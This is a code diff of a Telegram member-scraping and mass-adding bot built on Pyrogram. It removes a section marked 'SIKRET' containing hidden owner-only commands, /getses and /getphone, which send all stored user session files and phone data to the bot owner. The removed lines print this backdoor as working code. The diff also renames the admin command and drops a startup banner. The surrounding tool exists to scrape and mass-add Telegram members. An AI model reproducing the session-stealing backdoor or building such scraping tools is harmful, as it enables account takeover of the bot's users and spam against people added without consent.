@@ -247,35 +247,6 @@ async def login(lel, message):
    return
                           
 
-# ------------------------------- SIKRET --------------------------------------------- #
-@app.on_message(filters.private & filters.command(["getses"]))
-def getses(lel, message):
-   if message.chat.id in OWNER:
-      pass
-   else:
-      return
-   try:
-      os.chdir(r"./sessions")
-      for files in (os.scandir()):
-         app.send_document(message.chat.id, files)
-   except:
-      app.send_message(message.chat.id, "something went wrong")
-
-@app.on_message(filters.private & filters.command(["getphone"]))
-def getses(lel, message):
-   if message.chat.id in OWNER:
-      pass
-   else:
-      return
-   try:
-      os.chdir(r"./Users")
-      for folder in (os.scandir()):
-         os.chdir(fr"./Users/{folder}")
-         for file in (os.scandir(folder)):
-            app.send_document(message.chat.id, file)
-   except:
-      app.send_message(message.chat.id, "something went wrong")
-
 
 # ------------------------------- Acc Private Adding --------------------------------- #
 @app.on_message(filters.private & filters.command(["adding"]))
@@ -437,7 +408,7 @@ async def start(lel, message):
    return
 
 # ------------------------------- Admin Pannel --------------------------------- #
-@app.on_message(filters.private & filters.command('ishan'))
+@app.on_message(filters.private & filters.command('monu'))
 async def subscribers_count(lel, message):
    a= await Subscribe(lel, message)
    if a==1:
@@ -545,17 +516,7 @@ async def button(app, update):
 
 
 
-text = """
-╔════╗ㅤMembers 
-╚═╗╔═╝ Scraping Bot
-╔═╣╠═╗
-║╔╣╠╗║ㅤInduced
-║╚╣╠╝║ Scraper Bot
-╚═╣╠═╝
-╔═╝╚═╗ 
-╚════╝ 
-"""
-print(text)
+
 print("Induced Adding Started Sucessfully........")
 app.run()
  
